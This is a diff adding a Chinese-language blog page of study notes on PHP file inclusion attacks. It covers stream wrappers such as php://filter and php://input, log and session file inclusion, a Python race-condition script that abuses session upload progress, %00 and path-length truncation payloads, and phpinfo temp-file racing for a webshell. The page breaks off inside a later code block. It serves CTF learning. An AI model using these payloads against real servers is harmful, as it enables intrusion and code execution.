@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>安全牛文件包含学习笔记 - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="安全牛文件包含学习笔记" />
+<meta property="og:description" content="0x00 常见文件包含情况 相关函数： • include() 路径不存在时，发出警告，但继续执行后续代码 • include_once() 不会再次包含 • require() 路径不存在时，发出警告，不执行继续执行后续代码" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-03-12T16:21:00+00:00" />
+<meta property="article:modified_time" content="2021-03-12T16:21:00+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="安全牛文件包含学习笔记"/>
+<meta name="twitter:description" content="0x00 常见文件包含情况 相关函数： • include() 路径不存在时，发出警告，但继续执行后续代码 • include_once() 不会再次包含 • require() 路径不存在时，发出警告，不执行继续执行后续代码"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><link rel="prev" href="https://hannibal0x.github.io/2021-03-08-overthewirebandit/" /><link rel="next" href="https://hannibal0x.github.io/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "安全牛文件包含学习笔记",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0\/"
+        },"genre": "posts","keywords": "Web安全, CTF","wordcount":  4591 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0\/","datePublished": "2021-03-12T16:21:00+00:00","dateModified": "2021-03-12T16:21:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">安全牛文件包含学习笔记</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%AD%A6%E4%B9%A0/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>学习</a>&nbsp;<a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>安全技术</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-03-12">2021-03-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;4591 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;10 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-常见文件包含情况">0x00 常见文件包含情况</a></li>
+    <li><a href="#0x01-phar和zip">0x01 Phar://和Zip://</a></li>
+    <li><a href="#0x02--filter和input伪协议日志文件session">0x02  filter和input伪协议、日志文件、session</a></li>
+    <li><a href="#0x03-sessionupload_progressenable">0x03 session.upload_progress.enable</a></li>
+    <li><a href="#0x04-远古截断利用phpinfo包含临时文件">0x04 远古截断、利用phpinfo包含临时文件</a></li>
+    <li><a href="#0x05-自包含php7segmentfault">0x05 自包含、php7SegmentFault</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="has-toc have-toc">
+</div>
+<h2 id="0x00-常见文件包含情况">0x00 常见文件包含情况</h2>
+<p>相关函数：<br>
+• include() 路径不存在时，发出警告，但继续执行后续代码<br>
+• include_once() 不会再次包含<br>
+• require() 路径不存在时，发出警告，不执行继续执行后续代码<br>
+• require_once() 不会再次包含</p>
+<p>包含的时候，不一定是要去包含php文件（即非可执行的php文件），只要包含一块完整php代码即可，<?php XXX ?></p>
+<p>重点在于找到可控文件</p>
+<p>allow_url_include<br>
+This option allows the use of URL-aware fopen wrappers with the following functions: include, include_once, require, require_once.</p>
+<p>伪协议<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="631" height="516" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-80.png" alt="" class="wp-image-2544" /> </figure></p>
+<h2 id="0x01-phar和zip">0x01 Phar://和Zip://</h2>
+<p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件。</p>
+<p><code>phar:// [压缩文件路径]#[压缩文件内的子文件名]</code></p>
+<p>zlib:// &ndash; bzip2:// &ndash; zip:// — 压缩流，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p>
+<p><code>zip://[压缩文件路径]#[压缩文件内的子文件名]</code>,%23可替换#。</p>
+<ul>
+<li><var>compress.zlib://file.gz</var></li>
+<li><var>compress.bzip2://file.bz2</var></li>
+<li><var>zip://archive.zip#dir/file.txt</var></li>
+</ul>
+<h2 id="0x02--filter和input伪协议日志文件session">0x02  filter和input伪协议、日志文件、session</h2>
+<p><var>php://filter</var> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
+<p><var>php://filter</var> 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1299" height="281" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-81.png" alt="" class="wp-image-2549" /> </figure></p>
+<p>范例：<code>php://filter/read=convert.base64-encode/resource=[文件名]</code></p>
+<p>不要read也可以正常跑，但不标准</p>
+<p><var>php://input</var> 是个可以访问请求的原始数据的只读流。 在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</p>
+<p>利用条件：<br>
+1、allow_url_include = On。<br>
+2、对 allow_url_fopen 不做要求。</p>
+<table>
+<thead>
+<tr>
+<th>字符串过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string.rot13</td>
+<td>等同于<code>str_rot13()</code>，rot13变换</td>
+</tr>
+<tr>
+<td>string.toupper</td>
+<td>等同于<code>strtoupper()</code>，转大写字母</td>
+</tr>
+<tr>
+<td>string.tolower</td>
+<td>等同于<code>strtolower()</code>，转小写字母</td>
+</tr>
+<tr>
+<td>string.strip_tags</td>
+<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>转换过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>convert.base64-encode &amp; convert.base64-decode</td>
+<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
+</tr>
+<tr>
+<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
+<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>压缩过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>zlib.deflate &amp; zlib.inflate</td>
+<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
+</tr>
+<tr>
+<td>bzip2.compress &amp; bzip2.decompress</td>
+<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>加密过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>mcrypt.*</td>
+<td>libmcrypt 对称加密算法</td>
+</tr>
+<tr>
+<td>mdecrypt.*</td>
+<td>libmcrypt 对称解密算法</td>
+</tr>
+</tbody>
+</table>
+<p>很多时候，web 服务器会将请求写入到日志文件中，比如说 apache。在用户发起请求时，会将请求写入 access.log，当发生错误时将错误写入 error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>
+<p>PHP 默认生成的 Session 文件往往存放在 /tmp 目录下。存储路径在phpinfo的<code>session.save_path</code>。</p>
+<h2 id="0x03-sessionupload_progressenable">0x03 session.upload_progress.enable</h2>
+<p>session.upload_progress.enabled这个参数在php.ini 默认开启，需要手动置为Off，如果不是Off，就会在上传的过程中生成上传进度文件，它的存储路径可以在phpinfo获取到。/var/lib/php/sess_{your_php_session_id}</p>
+<p>session.upload_progress.enabled : 是否启用上传进度报告(默认开启)</p>
+<p>session.upload_progress.cleanup: 是否在上传完成后及时删除进度数据(默认开启),生成的文件会定时清空，不能写入恶意代码，这时候需要条件竞争。<a href="https://findneo.github.io/181123-one-line-php-challenge/" data-type="URL" data-id="https://findneo.github.io/181123-one-line-php-challenge/" target="_blank" rel="noreferrer noopener" rel="nofollow" >参考代码</a>示例如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#loop.py</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">multiprocessing.dummy</span> <span class="kn">import</span> <span class="n">Pool</span> <span class="k">as</span> <span class="n">threadpool</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sessname</span><span class="o">=</span><span class="s2">&#34;iamnotorange&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">runner</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">cmd</span><span class="o">=</span><span class="s2">&#34;curl -s 127.0.0.1/oneline.php -H &#39;Cookie: PHPSESSID=</span><span class="si">%s</span><span class="s2">&#39; -F &#39;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking&#39; -F &#39;file=@/etc/passwd&#39; 1&gt;/dev/null&#34;</span><span class="o">%</span><span class="n">sessname</span>
+</span></span><span class="line"><span class="cl">	<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;xxd /var/lib/php/sessions/sess_</span><span class="si">%s</span><span class="s2"> &#34;</span><span class="o">%</span><span class="n">sessname</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pool</span><span class="o">=</span><span class="n">threadpool</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span><span class="o">=</span><span class="n">pool</span><span class="o">.</span><span class="n">map_async</span><span class="p">(</span><span class="n">runner</span><span class="p">,</span><span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">))</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>curl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思。参考自：<a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html" target="_blank" rel="noopener noreffer ">https://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-A参数指定客户端的用户代理标头，即User-Agent。curl 的默认用户代理字符串是curl/[version]
+</span></span><span class="line"><span class="cl">范例：curl -A &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#39; https://google.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-b参数用来向服务器发送Cookie。
+</span></span><span class="line"><span class="cl">范例1：curl -b &#39;foo=bar&#39; https://google.com
+</span></span><span class="line"><span class="cl">范例2：curl -b &#39;foo1=bar;foo2=bar2&#39; https://google.com
+</span></span><span class="line"><span class="cl">范例3：curl -b cookies.txt https://www.google.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-c参数将服务器设置的Cookie 写入一个文件。
+</span></span><span class="line"><span class="cl">范例：curl -c cookies.txt https://www.google.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-d参数用于发送POST请求的数据体。
+</span></span><span class="line"><span class="cl">范例1：curl -d&#39;login=emma＆password=123&#39;-X POST https://google.com/login
+</span></span><span class="line"><span class="cl">范例2：curl -d &#39;login=emma&#39; -d &#39;password=123&#39; -X POST  https://google.com/login
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--data-urlencode参数等同于-d，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-e参数用来设置HTTP的标头Referer，表示请求的来源。
+</span></span><span class="line"><span class="cl">范例：curl -e &#39;https://google.com?q=example&#39; https://www.example.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-F参数用来向服务器上传二进制文件。
+</span></span><span class="line"><span class="cl">范例1：curl -F &#39;file=@photo.png&#39; https://google.com/profile
+</span></span><span class="line"><span class="cl">上面命令会给 HTTP 请求加上标头Content-Type: multipart/form-data，然后将文件photo.png作为file字段上传。
+</span></span><span class="line"><span class="cl">-F参数可以指定MIME类型。
+</span></span><span class="line"><span class="cl">范例2：curl -F &#39;file=@photo.png;type=image/png&#39; https://google.com/profile
+</span></span><span class="line"><span class="cl">上面命令指定 MIME 类型为image/png，否则 curl 会把 MIME 类型设为application/octet-stream。
+</span></span><span class="line"><span class="cl">-F参数也可以指定文件名。
+</span></span><span class="line"><span class="cl">curl -F &#39;file=@photo.png;filename=me.png&#39; https://google.com/profile
+</span></span><span class="line"><span class="cl">上面命令中，原始文件名为photo.png，但是服务器接收到的文件名为me.png。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-G参数用来构造GET请求URL的查询字符串。
+</span></span><span class="line"><span class="cl">范例：curl -G -d &#39;q=kitties&#39; -d &#39;count=20&#39; https://google.com/search
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-H参数添加 HTTP 请求的标头。
+</span></span><span class="line"><span class="cl">范例1：curl -H &#39;Accept-Language: en-US&#39; -H &#39;Secret-Message: xyzzy&#39; https://google.com
+</span></span><span class="line"><span class="cl">范例2：curl -d &#39;{&#34;login&#34;: &#34;emma&#34;, &#34;pass&#34;: &#34;123&#34;}&#39; -H &#39;Content-Type: application/json&#39; https://google.com/login
+</span></span><span class="line"><span class="cl">上面命令添加 HTTP 请求的标头是Content-Type: application/json，然后用-d参数发送 JSON 数据。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-i参数打印出服务器回应的 HTTP 标头。
+</span></span><span class="line"><span class="cl">范例：curl -i https://www.example.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-I参数向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-k参数指定跳过 SSL 检测。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-L参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--limit-rate用来限制 HTTP 请求和回应的带宽，模拟慢网速的环境。
+</span></span><span class="line"><span class="cl">范例：curl --limit-rate 200k https://google.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-o参数将服务器的回应保存成文件，等同于wget命令。
+</span></span><span class="line"><span class="cl">范例：curl -o example.html https://www.example.com
+</span></span><span class="line"><span class="cl">上面命令将www.example.com保存成example.html。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-O参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。
+</span></span><span class="line"><span class="cl">范例：curl -O https://www.example.com/foo/bar.html
+</span></span><span class="line"><span class="cl">上面命令将服务器回应保存成文件，文件名为bar.html。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-s参数将不输出错误和进度信息。
+</span></span><span class="line"><span class="cl">如果想让 curl 不产生任何输出，可以使用curl -s -o /dev/null https://google.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-S参数指定只输出错误信息
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-u参数用来设置服务器认证的用户名和密码。
+</span></span><span class="line"><span class="cl">范例1：curl -u &#39;bob:12345&#39; https://google.com/login
+</span></span><span class="line"><span class="cl">上面命令设置用户名为bob，密码为12345，然后将其转为 HTTP 标头Authorization: Basic Ym9iOjEyMzQ1。
+</span></span><span class="line"><span class="cl">范例2： curl https://bob:12345@google.com/login
+</span></span><span class="line"><span class="cl">上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。
+</span></span><span class="line"><span class="cl">范例3： curl -u &#39;bob&#39; https://google.com/login
+</span></span><span class="line"><span class="cl">上面命令只设置了用户名，执行后，curl 会提示用户输入密码。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-v参数输出通信的整个过程，用于调试。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--trace参数也可以用于调试，还会输出原始的二进制数据。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-x参数指定 HTTP 请求的代理。
+</span></span><span class="line"><span class="cl">范例1：curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com
+</span></span><span class="line"><span class="cl">上面命令指定 HTTP 请求通过myproxy.com:8080的 socks5 代理发出。
+</span></span><span class="line"><span class="cl">范例2：curl -x james:cats@myproxy.com:8080 https://www.example.com
+</span></span><span class="line"><span class="cl">如果没有指定代理协议，默认为 HTTP。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-X参数指定 HTTP 请求的方法。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x04-远古截断利用phpinfo包含临时文件">0x04 远古截断、利用phpinfo包含临时文件</h2>
+<p>phpinfo中open_basedir能够查看用户能够访问的路径。</p>
+<p><code>%00</code>截断(需要 magic_quotes_gpc=off，PHP小于5.3.4有效(?))</p>
+<p>范例：url/?page=phpinfo.txt%00</p>
+<p>路径长度截断：<code>./</code>和<code>.</code>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>
+<p>范例： url/?page=phpinfo.txt.(n个.)</p>
+<p>向服务器上任意php文件以form-data方式提交请求上传数据时，会生成临时文件,通过phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
